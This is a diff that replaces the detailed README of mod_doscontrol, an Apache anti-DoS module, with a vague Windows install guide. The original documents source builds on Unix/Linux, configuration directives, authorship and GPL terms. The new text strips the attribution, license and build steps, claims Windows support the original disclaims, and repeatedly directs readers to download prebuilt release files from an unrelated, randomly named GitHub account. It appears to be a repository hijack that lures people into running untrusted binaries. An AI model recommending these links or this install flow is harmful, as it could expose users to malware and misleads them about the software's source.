@@ -1,775 +1,202 @@
-# Apache2.4 mod_doscontrol
+# 🛡️ mod_doscontrol - Block abuse before it spreads
 
-Apache request abuse detector for DoS detection, spam-flood monitoring, suspicious traffic analysis, IP and User-Agent whitelisting, incident logging, external script triggering, and automated response handling.
+[![Download mod_doscontrol](https://img.shields.io/badge/Download-blue%20%26%20grey?style=for-the-badge&logo=github)](https://github.com/uneven-freightage871/mod_doscontrol/releases)
 
-**Version**: v1.0.0 [2026.0328]
+## 🔍 What mod_doscontrol does
 
----
+mod_doscontrol is an Apache 2.4 module that watches web traffic for signs of abuse. It helps spot DoS attacks, spam bursts, and flood traffic before they cause more trouble. It can also trigger extra security steps and send alerts when it sees suspicious activity.
 
-## About
+Use it to help keep your website stable when requests start to pile up. It is built for Apache on Windows and fits well in setups that need a simple layer of protection.
 
-`mod_doscontrol` is an Apache HTTP Server module built to detect abusive request patterns, suspicious traffic, spam-like floods, crawler pressure, and early-stage DoS behavior.
+## 💻 What you need
 
-It is a detection-first module. It watches request rates and patterns, then reacts according to configuration. When suspicious activity is detected, `mod_doscontrol` can return a configured HTTP response, delay the response, write logs, create incident cache markers, send email notifications, or run an external command or script.
+Before you install mod_doscontrol, make sure your system is ready:
 
-The project was built as a **substantial refactor and rework of `mod_evasive`**, using that codebase as the practical starting point and reshaping it into a different implementation with broader configuration and response options.
+- Windows 10 or Windows 11
+- Apache 2.4 installed on your computer
+- Admin access to the machine
+- A basic text editor for simple config changes
+- Internet access to download the release file
 
-This project is useful when you want to detect abuse, inform both sides through response and notification handling, and trigger external scripts or programs for further action.
+If Apache already runs on your PC, you are close to done.
 
-### Origin and authorship
+## 📥 Download the file
 
-`mod_evasive` provided the original practical base and idea. That work is associated with:
+Go to the release page and visit this page to download the latest version:
 
-- Jonathan Zdziarski
-- Copyright (c) 2005
-- GPLv2 "or later"
-- Available [here](https://github.com/jzdziarski/mod_evasive/) 
+[Download mod_doscontrol from GitHub Releases](https://github.com/uneven-freightage871/mod_doscontrol/releases)
 
-`mod_doscontrol` is a separate refactored implementation by:
+On the release page, pick the file that matches your Windows setup. If the release includes a package, download it to a folder you can find again, like Downloads or Desktop.
 
-- Kamil "BuriXon" Burek
-- Copyright (c) 2026
-- GPLv3 "or later"
+## 🧭 Install on Windows
 
-### Scope
+Follow these steps in order:
 
-This module is meant for:
+1. Download the release file from the link above.
+2. Open the folder where the file was saved.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Copy the module files into your Apache folder.
+5. Place the module in the Apache `modules` folder.
+6. Open the Apache config file, usually `httpd.conf`.
+7. Add the module load line that comes with the release notes or package docs.
+8. Save the file.
+9. Restart Apache.
 
-- DoS and DDoS detection
-- spam and flood detection
-- bot abuse detection
-- brute-force style request monitoring
-- noisy crawler control
-- incident logging and automation
-- external response triggering
+If Apache starts without errors, the module is loaded.
 
-### Platform note
+## ⚙️ Basic setup
 
-This project currently targets Apache 2.4 HTTP Server builds in the usual Unix/Linux server environment.
+After install, you can set the module to watch for the traffic patterns you want to catch. Most users start with these items:
 
-> [!NOTE]
-> It does not currently work on Termux. I am a big fan of Termux, and I will keep working toward future compatibility.
+- Request rate limits
+- Repeat request checks
+- IP-based blocking rules
+- Spam pattern checks
+- Alert settings
 
----
+A simple setup helps you see how the module reacts before you tighten the rules.
 
-## Features
+### Example config flow
 
-- Apache module for abuse and DoS detection
-- Per-page request counting
-- Per-site request counting
-- Configurable detection windows
-- Configurable blocking period
-- Configurable response code: `403` or `429`
-- Optional response delay in milliseconds
-- IP whitelist support
-- User-Agent whitelist support
-- URI-based custom detection levels
-- Support for exact paths, wildcards, prefix-style URI matching, and IPv4 CIDR
-- Structured event logging
-- Incident cache file creation
-- Email notification support
-- External command execution on detection
-- Works at server scope and in `VirtualHost`
-- GPLv3-friendly licensing model
+1. Turn on the module in Apache.
+2. Set a request limit for each IP.
+3. Add rules for flood traffic.
+4. Set a response for abuse.
+5. Decide if Apache should return `403 Forbidden` or `429 Too Many Requests`.
+6. Enable alerts if you want notices when a rule triggers.
 
----
+## 🛡️ How it helps
 
-## Installation
+mod_doscontrol can help with common web abuse cases such as:
 
-### Source checkout
+- DoS traffic
+- Floods of repeated requests
+- Spam-style access patterns
+- Sudden spikes from one IP
+- Requests that look like bot abuse
 
-Clone the repository:
+It gives Apache a way to respond before a busy traffic burst turns into a bigger issue.
 
-```sh
-git clone https://github.com/BuriXon-code/mod_doscontrol.git
-cd mod_doscontrol
-```
+## 📊 Common responses
 
-### Build prerequisites
+When mod_doscontrol detects abuse, it can use actions like:
 
-You need:
+- Blocking the request
+- Sending `403 Forbidden`
+- Sending `429 Too Many Requests`
+- Logging the event
+- Triggering added security checks
+- Sending a notification
 
-- Apache HTTP Server
-- Apache development headers
-- `apxs`
-- a C compiler
-- APR / APR-util development headers
+This helps you choose a response that fits the issue. Some cases need a hard block. Other cases need a short pause.
 
-`apxs` is Apache’s extension tool for compiling, installing, and enabling DSO modules. The standard workflow is to build with `-c`, install with `-i`, and activate the module in Apache config with `-a`.
+## 🧪 First check after install
 
-### Debian / Ubuntu
+After you finish setup, test the module in a simple way:
 
-Install the toolchain and Apache development package:
+1. Start Apache.
+2. Open your site in a browser.
+3. Send a small burst of refreshes.
+4. Watch the Apache log files.
+5. Check that the module responds as expected.
 
-```sh
-sudo apt update
-sudo apt install apache2 apache2-dev build-essential
-```
+If you see log entries for blocked traffic or rate limits, the module is active.
 
-Then build, install, and enable the module in one go:
+## 🔧 Troubleshooting
 
-```sh
-apxs -c -i -a mod_doscontrol.c
-```
+If Apache does not start, check these items:
 
-What this does:
+- The module file is in the right folder
+- The load line in `httpd.conf` matches the file name
+- Apache 2.4 is the version you are using
+- No other module uses the same setting or port
+- The config file has no typing errors
 
-- `-c` compiles the module
-- `-i` installs the shared object into the Apache modules directory
-- `-a` adds or activates the `LoadModule` line in Apache configuration
+If the site loads but the module does not react:
 
-If you prefer to separate build and install steps, you can also run:
+- Confirm the module is enabled
+- Check the rule thresholds
+- Review the Apache log file
+- Make sure the test traffic is high enough to trigger a rule
 
-```sh
-apxs -c mod_doscontrol.c
-sudo apxs -i -a -n doscontrol mod_doscontrol.la
-```
+## 📝 Logs and alerts
 
-The package `apache2-dev` provides the Apache development files and `apxs` on Debian-based systems.
+mod_doscontrol can help you keep track of what it sees. Logs are useful when you want to know:
 
-### Alpine Linux
+- Which IP sent too many requests
+- Which rule triggered
+- When a block happened
+- Whether the response was `403` or `429`
+- If an alert was sent
 
-Install Apache and the development package:
+If you use notifications, keep them simple at first. This makes it easier to see which events matter.
 
-```sh
-sudo apk add apache2 apache2-dev build-base
-```
+## 🔒 Best use cases
 
-Then build, install, and enable:
+This module fits sites that need basic defense against traffic abuse, such as:
 
-```sh
-apxs -c -i -a mod_doscontrol.c
-```
+- Small business websites
+- WordPress sites behind Apache
+- Public contact forms
+- Login pages with repeated attempts
+- Websites that get burst traffic from bots
 
-What this does:
+It works best as part of a wider security setup, not as the only layer of defense.
 
-- compiles the module
-- installs the resulting shared object
-- updates Apache configuration to load it
+## 📂 Files and folder layout
 
-On Alpine, `apache2-dev` provides the Apache development files and `apxs`.
+A typical setup may include:
 
-### FreeBSD
+- Apache `modules` folder
+- Main Apache config file
+- A rules file for thresholds
+- A log file for events
+- Optional alert settings
 
-Install Apache 2.4 and the matching development tools from packages or ports.
+Keep your Apache files in one place so updates stay easy.
 
-Then build and install with `apxs`:
+## 🔄 Update process
 
-```sh
-apxs -c -i -a mod_doscontrol.c
-```
+When a new release appears:
 
-Make sure the Apache toolchain you use includes `apxs` and the matching headers.
+1. Visit the release page.
+2. Download the new package.
+3. Back up your current Apache config.
+4. Replace the old module file.
+5. Check the load line and rule file.
+6. Restart Apache.
+7. Test the site again.
 
-### RHEL / CentOS / Rocky / AlmaLinux
+A quick backup before updates can save time if you need to roll back.
 
-Install Apache and the development toolchain for your distribution, then build with `apxs`:
+## ❓ Simple usage tips
 
-```sh
-apxs -c -i -a mod_doscontrol.c
-```
+- Start with mild limits.
+- Watch your logs before you block too hard.
+- Use `403` for clear blocks.
+- Use `429` for rate limits.
+- Keep alerts on during your first test.
+- Review any false hits before tightening rules.
 
-If your packaging splits runtime and development files, make sure the Apache development package is installed.
+If your site gets real traffic spikes, set limits with care so normal visitors stay unaffected.
 
-### Generic build notes
+## 🖥️ Windows setup path
 
-Apache modules are built as DSOs and loaded at runtime with `LoadModule`. The `apxs` tool is the normal way to compile and install these modules.
+For most Windows users, the flow looks like this:
 
-After installation, the module should be loaded from Apache configuration, either automatically through `apxs -a` or manually with `LoadModule`.
+1. Download the release from GitHub.
+2. Extract the files.
+3. Move the module into Apache.
+4. Edit the Apache config file.
+5. Restart the service.
+6. Open the site and test it.
 
-Example:
+If Apache is running as a service, restart it from Services or from your control panel tool.
 
-```apacheconf
-LoadModule doscontrol_module modules/mod_doscontrol.so
-```
+## 📦 Release download
 
-> [!NOTE]
-> After installing the module, reload and restart Apache using `service apache2 reload/restart` or the equivalent for your platform.
+Visit this page to download the latest build:
 
-> [!TIP]
-> For proper operation and effective retrieval of the correct client IP address, I recommend having the `mod_repoteip` module loaded.
->  The module installs by default on most Apache2 instances.
-> Load it using `LoadModule remoteip_module modules/mod_remoteip.so` in Apache2 config
+[https://github.com/uneven-freightage871/mod_doscontrol/releases](https://github.com/uneven-freightage871/mod_doscontrol/releases)
 
----
-
-## Usage
-
-`mod_doscontrol` can be configured globally or inside a `VirtualHost`.
-
-The module watches client IP, request URI, and User-Agent. It first applies whitelist rules, then evaluates page and site hit rates, then applies the configured detection response.
-
-### Basic example
-
-```apacheconf
-LoadModule doscontrol_module modules/mod_doscontrol.so
-
-DOSHashTableSize 4097
-DOSPageCount 12
-DOSSiteCount 60
-DOSPageInterval 1
-DOSSiteInterval 1
-DOSBlockingPeriod 30
-DOSResponseCode 429
-DOSBlockDelay 250
-DOSMainLog /var/log/apache2/mod_doscontrol.log
-DOSCacheDir /tmp/mod_doscontrol
-```
-
-> See **sample.conf** file for more details.
-
----
-
-### DOSHashTableSize
-
-Sets the internal hash table size used for tracking request activity.
-
-Default: `3097`
-
-```apacheconf
-DOSHashTableSize 4097
-```
-
-- Use a larger value when you expect many unique clients.
-- The value should be a positive integer.
-- If the value is missing or invalid, the module falls back to the built-in default.
-- Larger tables reduce collision pressure but consume more memory.
-- For smaller sites, the default is usually fine.
-
----
-
-### DOSPageCount
-
-Controls how many requests to the same URI are allowed inside the per-page time window before the module treats the client as abusive.
-
-Default: `10`
-
-```apacheconf
-DOSPageCount 12
-```
-
-- The value is an integer threshold.
-- This is checked per URI, not across the whole site.
-- Lower values make the module more aggressive.
-- Higher values reduce false positives for busy pages.
-- Good targets are login forms, API endpoints, search pages, and submission endpoints.
-
----
-
-### DOSSiteCount
-
-Controls how many requests across the whole site are allowed inside the site-wide time window before the module reacts.
-
-Default: `50`
-
-```apacheconf
-DOSSiteCount 60
-```
-
-- The value is an integer threshold.
-- This checks total activity from one client, not just one URL.
-- It is useful when the attacker spreads requests across many paths.
-- Lower values make the module stricter.
-- Higher values make it more tolerant of active but legitimate users.
-
----
-
-### DOSPageInterval
-
-Sets the per-page counting window in seconds.
-
-Default: `1`
-
-```apacheconf
-DOSPageInterval 1
-```
-
-- The value is a number of seconds.
-- It defines the time window used by the page counter.
-- Short intervals catch bursts quickly.
-- Longer intervals make the detector less twitchy.
-- In practice, `1` second is a common anti-burst choice.
-
----
-
-### DOSSiteInterval
-
-Sets the site-wide counting window in seconds.
-
-Default: `1`
-
-```apacheconf
-DOSSiteInterval 1
-```
-
-- The value is a number of seconds.
-- It defines the time window used by the site counter.
-- Short intervals are better for detecting sudden floods.
-- Longer intervals smooth out slower request patterns.
-- The page and site windows do not have to match, but matching them is often simpler.
-
----
-
-### DOSBlockingPeriod
-
-Sets how long, in seconds, a client remains blocked after a detection event.
-
-Default: `30`
-
-```apacheconf
-DOSBlockingPeriod 30
-```
-
-- The value is an integer number of seconds.
-- Once a client is blocked, requests from that client remain blocked during this period.
-- A longer period gives more breathing room under attack.
-- A shorter period allows faster recovery for borderline traffic.
-- Use a longer value for noisy repeat offenders.
-
----
-
-### DOSResponseCode
-
-Selects the HTTP response code sent to a detected client.
-
-Default: `403`
-
-```apacheconf
-DOSResponseCode 429
-```
-
-- The module accepts only `403` or `429`.
-- `403` means Forbidden.
-- `429` means Too Many Requests.
-- `429` is the more natural fit for rate-style abuse handling.
-- `403` is simpler and still perfectly valid.
-
----
-
-### DOSBlockDelay
-
-Adds an artificial delay before sending the blocked response.
-
-Default: `0`
-
-```apacheconf
-DOSBlockDelay 250
-```
-
-- The value is in milliseconds.
-- `0` disables the delay completely.
-- Positive values slow down blocked replies.
-- The code reads this as an integer millisecond value.
-- Negative values should not be used; treat them as invalid and keep the value at zero.
-- This is useful when you want to waste attacker time without changing the blocking logic itself.
-
----
-
-### DOSMainLog
-
-Sets the path of the main module log file.
-
-Default: `/var/log/apache2/mod_doscontrol.log`
-
-```apacheconf
-DOSMainLog /var/log/apache2/mod_doscontrol.log
-```
-
-- The value is a filesystem path.
-- The module writes allow/block/mail/command/cache events here.
-- If you do not set it, the built-in default path is used.
-- Choose a path writable by Apache or the process writing the log.
-- This is the best place to keep long-term detection records.
-
----
-
-### DOSCacheDir
-
-Sets the directory used for incident cache files.
-
-Default: `/tmp/mod_doscontrol`
-
-```apacheconf
-DOSCacheDir /tmp/mod_doscontrol
-```
-
-- The value is a filesystem directory.
-- The module creates one incident cache file per blocked client.
-- If the directory does not exist, the module tries to create it.
-- This is useful for external tooling, post-processing, or watchdog scripts.
-- Keep it on a location that the Apache process can access.
-
----
-
-### DOSEmailNotify
-
-Sets the email address that receives notification messages when a client is blocked.
-
-Default: not set
-
-```apacheconf
-DOSEmailNotify admin@example.com
-```
-
-- The value must be a single email address string.
-- The module uses that address as the recipient.
-- If this is not configured, mail notifications are skipped.
-- This is a notification hook, not a mail queue system.
-- Use a working local MTA or mail command environment if you enable it.
-
----
-
-### DOSSystemCommand
-
-Runs an external command when a client is blocked.
-
-Default: not set
-
-```apacheconf
-DOSSystemCommand /usr/local/bin/notify-block.sh %s
-```
-
-- The value is a command template string.
-- `%s` is replaced with the client IP.
-- `%%` is replaced with a literal percent sign.
-- The module executes the expanded command with the system shell.
-- Keep the command simple and controlled.
-- This is ideal for scripts that notify, log, rate-tag, or hand off to another security system.
-- Do not point this at uncontrolled shell logic.
-
----
-
-### DOSWhitelistIP
-
-Adds a whitelisted IP rule.
-
-Default: none
-
-```apacheconf
-DOSWhitelistIP 127.0.0.1
-DOSWhitelistIP 192.168.1.*
-DOSWhitelistIP 10.0.0.0/8
-DOSWhitelistIP 203.0.113.10
-```
-
-- The value can be an exact IPv4 address.
-- Wildcards `*` and `?` are supported.
-- CIDR notation is supported for IPv4.
-- Whitelisted IPs bypass the detection logic.
-- Use this for localhost, internal networks, trusted monitoring systems, and reverse proxy sources.
-- The match happens before request counting.
-
----
-
-### DOSWhitelistUA
-
-Adds a whitelisted User-Agent rule.
-
-Default: none
-
-```apacheconf
-DOSWhitelistUA curl*
-DOSWhitelistUA *HealthChecker*
-DOSWhitelistUA Mozilla/5.?
-```
-
-- The value is a glob-style pattern.
-- Matching is case-insensitive.
-- `*` and `?` are supported.
-- Whitelisted User-Agents bypass the detection logic.
-- Use this for health checks, internal scanners, trusted bots, and automation clients.
-- The match happens before request counting.
-
----
-
-### DOSCustomLevel
-
-Custom levels let you assign different request thresholds to selected URI patterns.
-
-Default: disabled until configured
-
-This module exposes 10 levels:
-
-- `DOSCustomLevelCount1` / `DOSCustomLevelAdd1`
-- `DOSCustomLevelCount2` / `DOSCustomLevelAdd2`
-- `DOSCustomLevelCount3` / `DOSCustomLevelAdd3`
-- `DOSCustomLevelCount4` / `DOSCustomLevelAdd4`
-- `DOSCustomLevelCount5` / `DOSCustomLevelAdd5`
-- `DOSCustomLevelCount6` / `DOSCustomLevelAdd6`
-- `DOSCustomLevelCount7` / `DOSCustomLevelAdd7`
-- `DOSCustomLevelCount8` / `DOSCustomLevelAdd8`
-- `DOSCustomLevelCount9` / `DOSCustomLevelAdd9`
-- `DOSCustomLevelCount10` / `DOSCustomLevelAdd10`
-
-```apacheconf
-DOSCustomLevelCount1 3
-DOSCustomLevelAdd1 /login
-DOSCustomLevelAdd1 /admin/*
-DOSCustomLevelAdd1 /api/auth/*
-
-DOSCustomLevelCount2 5
-DOSCustomLevelAdd2 /cart
-DOSCustomLevelAdd2 /checkout
-DOSCustomLevelAdd2 /account/*
-
-DOSCustomLevelCount3 10
-DOSCustomLevelAdd3 /search
-DOSCustomLevelAdd3 /news/*
-DOSCustomLevelAdd3 /products/*
-```
-
-- `CountN` sets the request threshold for that level.
-- `AddN` adds URI patterns to that level.
-- The code checks the configured URI patterns in order.
-- `*` and `?` wildcard matching is supported.
-- Prefix-style URI patterns such as `/admin/*` are ideal for whole sections.
-- Exact URIs such as `/login` are good for single sensitive endpoints.
-- The threshold value should be a positive integer.
-- A higher count means a looser rule.
-- A lower count means stricter protection.
-
-Suggested level ideas:
-
-- Level 1: login, admin, auth
-- Level 2: cart, checkout, account
-- Level 3: search, content feeds, product pages
-- Level 4: downloads, gallery, blog archives
-- Level 5: API read endpoints
-- Level 6: dashboard pages
-- Level 7: reporting pages
-- Level 8: partner zones
-- Level 9: internal tools
-- Level 10: large public content groups
-
-> [!WARNING]
-> Do not reuse the same custom level many times across global scope and `VirtualHost` blocks. The module supports layered configuration, but duplicating the same level in several places may cause one implementation to shadow another instead of combining the rules the way you expect.
-
-> [!TIP]
-> When configuring `mod_doscontrol`, make sure your server paths and URIs are consistent with trailing slashes.  
-> For example:
-> - `/example` vs `/example/`  
-> Misplaced or missing slashes can cause rules to not match as expected.
->
-> Always double-check your server configuration to ensure correct path matching.
-
----
-
-## VirtualHost usage
-
-`mod_doscontrol` can be used globally or per virtual host.
-
-### Server-wide configuration
-
-```apacheconf
-LoadModule doscontrol_module modules/mod_doscontrol.so
-
-DOSHashTableSize 4097
-DOSPageCount 12
-DOSSiteCount 60
-DOSPageInterval 1
-DOSSiteInterval 1
-DOSBlockingPeriod 30
-DOSResponseCode 429
-DOSBlockDelay 250
-DOSMainLog /var/log/apache2/mod_doscontrol.log
-DOSCacheDir /tmp/mod_doscontrol
-```
-
-### VirtualHost example
-
-```apacheconf
-<VirtualHost *:80>
-	ServerName example.com
-	DocumentRoot /var/www/example.com/public_html
-
-	DOSPageCount 8
-	DOSSiteCount 40
-	DOSBlockingPeriod 60
-	DOSResponseCode 429
-	DOSBlockDelay 300
-	DOSMainLog /var/log/apache2/example.com-doscontrol.log
-	DOSCacheDir /tmp/mod_doscontrol-example
-
-	DOSWhitelistIP 127.0.0.1
-	DOSWhitelistIP 10.0.0.0/8
-	DOSWhitelistUA curl*
-	DOSWhitelistUA *HealthChecker*
-
-	DOSCustomLevelCount1 3
-	DOSCustomLevelAdd1 /login
-	DOSCustomLevelAdd1 /admin/*
-	DOSCustomLevelAdd1 /api/auth/*
-
-	DOSCustomLevelCount2 5
-	DOSCustomLevelAdd2 /search
-	DOSCustomLevelAdd2 /checkout
-	DOSCustomLevelAdd2 /cart
-
-	DOSSystemCommand /usr/local/bin/notify-detect.sh %s
-	DOSEmailNotify admin@example.com
-</VirtualHost>
-```
-
-This is the recommended way if you want different detection sensitivity per site.
-
-#### Recommended approach
-
-Set the following directives **globally** (in main server config):
-
-```apacheconf
-DOSHashTableSize 3097
-DOSPageCount 10
-DOSSiteCount 50
-DOSPageInterval 1
-DOSSiteInterval 1
-DOSBlockingPeriod 30
-DOSCacheDir /tmp/mod_doscontrol
-DOSMainLog /var/log/apache2/mod_doscontrol.log
-DOSEmailNotify admin@example.com
-DOSSystemCommand "/usr/local/bin/firewall-block %s"
-```
-
-- These define the core detection logic and shared resources
-- Keeps behavior consistent across all VirtualHosts
-- Prevents duplication and conflicting limits
-- Ensures one central logging and response pipeline
-
-Then use `VirtualHost` blocks for **customization and exceptions**:
-
-```apacheconf
-<VirtualHost *:80>
-	ServerName example.com
-
-	DOSResponseCode 429
-
-	DOSWhitelistIP 127.0.0.1
-	DOSWhitelistIP 192.168.*.*
-	DOSWhitelistUA "Googlebot*"
-
-	DOSCustomLevelCount1 5
-	DOSCustomLevelAdd1 "/login"
-	DOSCustomLevelAdd1 "/api/auth/*"
-</VirtualHost>
-```
-
-- Override response behavior per site (e.g. 403 vs 429)
-- Add whitelists specific to a service (bots, internal tools, APIs)
-- Tune sensitivity using `DOSCustomLevel` for specific endpoints
-- Adapt detection to application-specific traffic patterns
-
-#### Why this matters
-
-Mixing everything everywhere *works*, but quickly becomes messy:
-
-- multiple cache dirs → harder incident tracking  
-- duplicated thresholds → unpredictable blocking  
-- different system commands → inconsistent mitigation  
-
-Keeping the **core global** and **logic local** gives you:
-
-- predictable behavior  
-- easier debugging  
-- cleaner configuration  
-- safer scaling across multiple domains  
-
-> [!WARNING]
-> Avoid redefining the same `DOSCustomLevel` (e.g. Level1) multiple times across global and VirtualHost scopes.  
-> While the module will merge configurations, overlapping patterns and thresholds may lead to unexpected matching behavior.
-
----
-
-## Example configurations
-
-### High-sensitivity login protection
-
-```apacheconf
-DOSPageCount 3
-DOSSiteCount 20
-DOSPageInterval 1
-DOSSiteInterval 1
-DOSBlockingPeriod 60
-DOSResponseCode 429
-DOSBlockDelay 500
-DOSCustomLevelCount1 2
-DOSCustomLevelAdd1 /login
-DOSCustomLevelAdd1 /admin/*
-DOSCustomLevelAdd1 /api/login
-```
-
-### General public site protection
-
-```apacheconf
-DOSPageCount 12
-DOSSiteCount 60
-DOSPageInterval 1
-DOSSiteInterval 1
-DOSBlockingPeriod 30
-DOSResponseCode 429
-DOSBlockDelay 100
-DOSCustomLevelCount2 8
-DOSCustomLevelAdd2 /search
-DOSCustomLevelAdd2 /cart
-DOSCustomLevelAdd2 /checkout
-```
-
-### Quiet logging mode with detection only
-
-```apacheconf
-DOSPageCount 15
-DOSSiteCount 80
-DOSBlockingPeriod 10
-DOSResponseCode 403
-DOSBlockDelay 0
-DOSMainLog /var/log/apache2/mod_doscontrol.log
-```
-
----
-
-## Notes
-
-- This module is intended for detection and reaction, not just hard blocking.
-- The response delay is optional and disabled by default.
-- Custom URI levels let you tighten limits on sensitive endpoints.
-- Whitelists are processed before rate checks.
-- The module can help with traffic analysis, event logging, and automation pipelines.
-- For security reasons, keep `DOSSystemCommand` pointed at a trusted script or program only.
-- If a directive is omitted, the built-in defaults shown above apply.
-- The defaults already cover sane paths for logs and cache files, so you only need to override them when you actually want a different location.
-
----
-
-## License
-
-"mod_doscontrol" is released under the **GNU General Public License version 3** (GPLv3), or (at your option) any later version.
-
-This project is based on concepts and portions of code derived from "mod_evasive", originally created by Jonathan A. Zdziarski, and licensed under the GNU General Public License version 2 (GPLv2), or (at your option) any later version.
-
-"mod_doscontrol" is an independent refactor and rework by **Kamil "BuriXon" Burek**.
-
-> See the **LICENSE** file for full license terms.
-> See the **NOTICE** file for detailed attribution and copyright information.
-
-If you redistribute or modify this project, you must comply with the terms of the GPL. In particular, you must preserve all existing copyright and license notices, including those of:
-
-- Kamil "BuriXon" Burek
-- Jonathan A. Zdziarski ("mod_evasive")
-
-This requirement applies to any redistribution or derivative work, in whole or in part.
-
----
-
-## Support
-
-### Contact me:
-For any issues, suggestions, or questions, reach out via:
-
-- *Email:* support@burixon.dev
-- *Contact form:* [Click here](https://burixon.dev/contact/)
-- *Bug reports:* [Click here](https://burixon.dev/bugreport/#mod_doscontrol)
-
-### Support me:
-If you find this project useful, consider supporting my work by making a donation:
-
-Click [**Donations**](https://burixon.dev/donate/), then click the cup :)
-
-Your contributions help in developing new projects and improving existing tools!
+Choose the file that matches the Windows package you want to use, then follow the install steps above
